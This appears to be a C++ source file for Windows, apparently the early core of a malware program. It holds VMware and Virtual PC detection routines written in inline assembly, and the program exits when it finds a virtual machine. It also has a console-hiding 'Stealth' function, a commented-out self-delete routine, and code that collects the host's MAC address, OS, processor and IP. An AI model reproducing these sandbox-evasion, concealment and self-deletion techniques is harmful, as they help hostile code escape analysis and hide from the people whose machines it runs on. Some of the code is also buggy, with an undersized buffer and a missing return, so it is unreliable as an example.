#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <Iphlpapi.h>
#include <Assert.h>
#include <strsafe.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable : 4996)

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

using namespace std;

bool IsInsideVMWare();
bool IsInsideVPC();
void Stealth();
char* getMAC();
char* GetOS();
bool selfDelete();
char* GetProcessor();
char* GetIP();

int main()
{
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	///Stealth();

	bool vm = IsInsideVMWare(), vpc = IsInsideVPC();
	char* mac = getMAC();
	char* os = GetOS();
	char* proc = GetProcessor();
	char* ip = GetIP();

	if (vm || vpc) return 0; //Change this to self delete?

	if (vm == false) cout << "vm false\n";
	else cout << "vm true\n";
	if (vpc == false) cout << "vpc false\n";
	else cout << "vpc true\n";

	cout << proc << "\n";
	cout << os << "\n";
	cout << ip << "\n";
	cout << mac << "\n";

	system("PAUSE");
	return 0;
}



bool IsInsideVMWare()
{
	bool rc = true;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
				push edx
				push ecx
				push ecx
				push ebx
				push ebx
				mov eax, 'VMXh'
				mov ebx, 0  //any value but not the MAGIC VALUE
				mov ecx, 10 // get VMWare versiond
				mov edx, 'VX'
				in eax, dx  //read port
				cmp ebx, 'VMXh' // is it a replay from VMWare
				setz rc
				pop ebx
				pop ecx
				pop edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}

	return rc;
}

bool IsInsideVPC()
{
	bool rc = false;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
				push ebx
				mov ebx, 0
				mov eax, 1
				__emit 0Fh
				__emit 3Fh
				__emit 07h
				__emit 0Bh
				test ebx, ebx
				setz[rc]
				pop ebx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return rc;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

char* getMAC(){
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
				sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
				return mac_addr;
				pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}
//self delete wont build
/*bool selfDelete()
{
	TCHAR szFile[1024], szCmd[1024];

	if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) &&
		(GetShortPathName(szFile, szFile, MAX_PATH) != 0))
	{
		lstrcpy(szCmd, "/c del ");
		lstrcat(szCmd, szFile);
		lstrcat(szCmd, " >> NUL");

		if ((GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) &&
			((int)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE)>32))
			return TRUE;
	}

	return FALSE;
}
*/

char* GetOS()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx){
#ifdef __APPLE__
		return "Mac";
#elif __linux__
		return "Linux";
#elif __unix__
		return "Unix";
#endif
		return "Other";
	}

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion == 6){
			if (osvi.dwMinorVersion == 0){
				if (osvi.wProductType == VER_NT_WORKSTATION)
					return "Windows Vista";
				else return "Windows Server 2008";
			}
			if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2){
				if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
					return "Windows 7";
				else
					if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
						return "Windows 8";
					else return "Windows Server 2008 R2";
			}
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
			if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				return "Windows Home Server";
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "Windows XP Professional";
			else return "Windows Server 2003";
		}

		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			return "Windows XP";
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			return "Windows 2000";
		return "Windows";
	}
	else
		return "Other";
}

char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx) return "Not Determined";

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}

char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;

}
